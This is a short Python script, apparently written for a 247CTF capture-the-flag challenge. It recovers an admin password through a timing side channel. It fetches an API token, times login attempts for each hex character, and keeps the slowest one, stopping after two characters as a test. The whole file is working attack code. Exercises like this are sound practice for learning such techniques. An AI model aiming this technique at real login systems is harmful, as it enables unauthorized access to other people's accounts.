#!/usr/bin/env python3
import requests
import time
import statistics

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=5)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=5
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

# Test con 2 mediciones por carácter, solo primeras 2 posiciones
api_token = get_token()
print(f"Token: {api_token}")

known = ""
for pos in range(2):
    print(f"\nPosición {pos}:")
    
    all_times = {char: [] for char in HEX_CHARS}
    
    for measurement in range(2):
        for char in HEX_CHARS:
            test_password = known + char + "0" * (31 - pos)
            result, elapsed = try_password("admin", test_password, api_token)
            all_times[char].append(elapsed)
    
    # Calcular promedios
    avgs = {char: statistics.mean(times) for char, times in all_times.items()}
    sorted_chars = sorted(avgs.items(), key=lambda x: x[1], reverse=True)
    
    print(f"  Top 5: {sorted_chars[:5]}")
    print(f"  Bottom 5: {sorted_chars[-5:]}")
    
    best_char = sorted_chars[0][0]
    known += best_char
    print(f"  Elegido: {best_char}")
    print(f"  Conocido hasta ahora: {known}")

print(f"\nContraseña parcial: {known}")
